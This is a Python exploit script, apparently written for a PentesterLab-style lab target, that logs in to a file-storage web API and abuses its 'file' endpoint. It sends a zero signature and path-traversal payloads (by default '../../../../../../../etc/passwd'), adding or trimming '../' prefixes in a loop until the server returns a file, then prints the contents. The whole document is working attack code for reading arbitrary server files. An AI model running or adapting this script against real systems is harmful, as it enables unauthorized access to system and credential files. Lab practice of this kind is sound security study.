#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from base64 import b64encode, b64decode
import requests, json, sys

user = "eritest"
password = "eritestpass"

DOMAIN = "http://ptl-f91b09ed-08c46e9c.libcurl.so/"
REGISTER = "register"
LOGIN = "login"
FILES = "files"
RFILE = "file"
UPLOAD = "upload"
TOKEN = ''

HEADERS = {"Content-type": "application/json"}

def login():
    return requests.post(DOMAIN+LOGIN, headers=HEADERS, data='{"username":"%s","password":"%s"}' % (user, password))

def register():
    return requests.post(DOMAIN+REGISTER, headers=HEADERS, data='{"username":"%s","password":"%s"}' % (user, password))

def files(TOKEN):
    return requests.post(DOMAIN+FILES, headers=HEADERS, data='{"token":"%s"}' % TOKEN)

def rfile(TOKEN, uuid, sig):
    return requests.post(DOMAIN+RFILE, headers=HEADERS, data='{"token":"%s", "uuid":"%s", "sig":%s}' % (TOKEN, str(uuid), str(sig)))

def upload(TOKEN, filename, content):
    return requests.post(DOMAIN+UPLOAD, headers=HEADERS, data='{"token": "%s", "filename":"%s", "content":"%s"}' % (TOKEN, filename, str(content)))

print("Trying to login/register...")

l = login()
text = json.loads(l.text)
if 'error' in text:
    print("Failed to login...")
    r = register()
    text = json.loads(r.text)
    if 'error' in text:
        print("Failed to register and login... bad luck!\n%s" % text['error'])
    elif 'token' in text:
        TOKEN = text['token']
    else:
        print("WTF!?\nResponse: %s" % text)
        exit(1)
elif 'token' in text:
    TOKEN = text['token']
else:
    print("WTF!?\nResponse: %s" % text)
    exit(1)

print("Successfully logged in (with token %s)!\n\nRetrieving file list..." % TOKEN)

l = files(TOKEN)
text = json.loads(l.text)
if 'files' in text:
    if len(text['files']) > 0:
        for f in text['files']:
            #print(json.dumps(f, indent=4))
            pass
    else:
        print("No files found.\nUploading a sample...")
        upload(TOKEN, "testfile", "file content")

if len(sys.argv) != 2:
    payload = "../../../../../../../etc/passwd"
    print("Trying with default payload.\nTo try a custom one, set it as first argument")
else:
    payload = "../../../" + sys.argv[1]

ex = rfile(TOKEN, payload, 0)
tries = 1
while len(ex.text) == 29 and '"error"' in ex.text:
    if tries >= 25:
        payload = payload.replace('../','./', 1)
    else:
        payload = "../" + payload
    try:
        ex = rfile(TOKEN, payload, 0)
        tries += 1
        #print("\n\nDEBUG: Content-Length: %d" % len(ex.text))
    except KeyboardInterrupt:
        print("Tried %d times" % tries)
        exit(1)

if '"content":false' in ex.text:
    print("\nSuccess, but the file %s does not exist... (tried %d times)" % (sys.argv[1], tries))
else:
    try:
        test = json.loads(ex.text.split('"file":')[1][:-1].replace('\/','/'))
        print("\nSuccess!\nAfter %d times, we got a hit, with payload %s\n\nLocation: %s\nContent:%s" % (tries, payload, ex.text.split('{')[0], json.dumps(test,indent=4)))
    except:
        print("\nSuccess!\nAfter %d times, we got a hit, with payload %s\n\nLocation: %s\nContent:%s" % (tries, payload, ex.text.split('{')[0], ex.text))


#print("\n\nDEBUG!!\n\nContent-length: %d\n%s" % (len(ex.text), ex.text))
